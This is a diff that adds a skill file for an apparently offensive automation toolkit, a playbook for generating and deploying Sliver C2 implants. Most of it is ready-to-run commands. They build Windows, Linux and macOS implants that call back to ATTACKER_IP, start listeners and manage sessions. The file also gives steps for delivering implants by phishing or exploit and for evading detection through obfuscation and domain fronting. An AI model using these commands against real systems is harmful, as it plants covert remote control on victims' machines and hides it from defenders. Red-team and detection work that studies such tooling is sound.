@@ -1,0 +1,52 @@
+---
+name: sliver-implant
+phase: c2
+mitre_ids: [T1071.001, T1573.002]
+opsec_level: 3
+description: Generate and deploy a Sliver C2 implant with mTLS or HTTP/2 transport
+module: phantom-sliver
+tools: [sliver-server, sliver-client]
+prerequisites: [sliver_server_running, listener_configured]
+---
+# Sliver C2 Implant Generation
+
+## Technique
+Generate a Sliver C2 implant binary for the target platform using mTLS or
+HTTP/2 transport.  Sliver provides encrypted, authenticated C2 channels with
+built-in evasion features.
+
+## Commands
+```bash
+# Start Sliver server (run once)
+sliver-server
+
+# In Sliver console: generate an mTLS implant
+generate --mtls ATTACKER_IP:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe
+
+# Generate a Linux implant with HTTP/2
+generate --http ATTACKER_IP:443 --os linux --arch amd64 --format elf --save /tmp/implant
+
+# Generate a macOS implant
+generate --mtls ATTACKER_IP:8888 --os darwin --arch arm64 --format macho --save /tmp/implant.macho
+
+# Start an mTLS listener
+mtls --lport 8888
+
+# List active sessions
+sessions
+```
+
+## Usage
+1. Start the Sliver server and configure a listener.
+2. Generate an implant for the target OS/arch.
+3. Deliver the implant to the target via phishing, exploit, or upload.
+4. Interact with the session once the implant calls back.
+
+## Detection Evasion
+- Use HTTPS/HTTP2 transport to blend with normal web traffic.
+- Enable traffic obfuscation with `--obfuscate` flag.
+- Use domain fronting for high-security environments.
+
+## MITRE ATT&CK
+- T1071.001 — Application Layer Protocol: Web Protocols
+- T1573.002 — Encrypted Channel: Asymmetric Cryptography
